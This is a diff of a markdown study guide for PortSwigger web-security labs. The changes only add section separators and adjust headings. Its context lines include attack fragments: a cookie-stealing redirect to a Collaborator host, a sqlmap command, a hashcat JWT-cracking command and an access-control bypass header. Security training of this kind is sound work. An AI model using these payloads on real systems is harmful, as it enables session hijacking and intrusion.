@@ -41,6 +41,8 @@
 
 [Footnote](#footnote)  
   
+-----
+
 # Foothold  
   
 # Content Discovery  
@@ -73,6 +75,8 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![dev-code-debug-comment deserial](images/dev-code-debug-comment.png)  
   
+-----
+
 ## DOM-Based XSS  
 
 [DOM XSS Indicators](#identify-dom-xss)  
@@ -318,6 +322,8 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 
 [PortSwigger Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)  
   
+-----
+
 ## Cross Site Scripting  
 
 [XSS Resources](#xss-resources)  
@@ -730,6 +736,8 @@ body:document.cookie
 
 [PortSwigger Lab: Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)  
   
+-----
+
 ## Web Cache Poison  
 
 [Unkeyed header](#unkeyed-header)  
@@ -836,6 +844,8 @@ document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 >Remove the ```cb=123``` cache **buster**, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.  
 
 [PortSwigger Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)  
+  
+-----
 
 ## Host Headers  
 
@@ -893,6 +903,8 @@ csrf=TheCSRFTokenValue&username=carlos
 ![single connection](images/single-connection.png)  
 
 [PortSwigger Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  
+  
+-----
 
 ## HTTP Request Smuggling  
 
@@ -1174,6 +1186,7 @@ Sec-Ch-Ua-Platform: "Linux"
 
 [PortSwigger Lab: Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)  
   
+-----
 
 ## Brute Force  
 
@@ -1254,12 +1267,14 @@ X-Forwarded-For: 12.13.14.15
 
 [PortSwigger Lab: Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)  
   
-# Authentication  
+-----
+
+## Authentication  
 
 [Account Registration](#account-registration)  
 [Auth Token bypass Macro](#auth-token-bypass-macro)  
   
-## Account Registration  
+### Account Registration  
 
 >Business logic flaw in the account registration feature allow for gaining foothold as target user role access. [Content Discovery](#content-discovery) find the path ```/admin```, message state the Admin interface is only available if logged in as a **DontWannaCry** user.  
 
@@ -1275,7 +1290,7 @@ very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so
 
 [PortSwigger Lab: Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)  
 
-## Auth Token bypass Macro  
+### Auth Token bypass Macro  
 
 >If the authentication login is protected against brute force by using random token that is used on every login POST, a Burp Macro can be used to bypass protection.  
   
@@ -1295,6 +1310,8 @@ very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so
 
 [PortSwigger Lab: Infinite money logic flaw - show how to create Burp Macro](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)  
   
+-----
+
 # Privilege Escalation  
   
 ## CSRF Account Takeover  
@@ -1513,6 +1530,8 @@ csrf=TOKEN&username=administrator
 
 [PortSwigger Lab: CSRF vulnerability with no defences](https://portswigger.net/web-security/csrf/lab-no-defenses)  
   
+-----
+
 ## Password Reset  
 
 [Refresh Password broken logic](#refresh-password-broken-logic)  
@@ -1545,6 +1564,8 @@ csrf=TOKEN&username=administrator
 
 [PortSwigger Lab: Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)  
   
+-----
+
 ## SQL Injection  
   
 [Blind Time Delay](#blind-time-delay)   
@@ -1815,6 +1836,8 @@ sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cache
 ![manual-sqli.png](images/manual-sqli.png)  
 
 [PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  
+  
+-----
 
 ## JWT  
 
@@ -1918,6 +1941,8 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 [PortSwigger Lab: JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)  
   
+-----
+
 ## ProtoType Pollution  
 
 >Attacker add arbitrary properties to global JavaScript object prototypes, which is inherited by user-defined objects that lead to client-side DOM XSS or server-side code execution.  
@@ -1967,6 +1992,8 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 [PortSwigger Lab: Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)  
   
+-----
+
 ## Access Control  
   
 [JSON roleid PrivEsc](#privesc-json-roleid)  
@@ -2025,6 +2052,8 @@ X-Original-URL: /admin
   
 [PortSwigger Lab: URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)  
   
+-----
+
 ## CORS  
 
 [Trusted insecure protocols](#trusted-insecure-protocols)  
@@ -2079,6 +2108,8 @@ Origin: http://subdomain.TARGET.NET
 
 [PortSwigger Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)  
   
+-----
+
 # Data Exfiltration  
 
 ## XXE Injections  
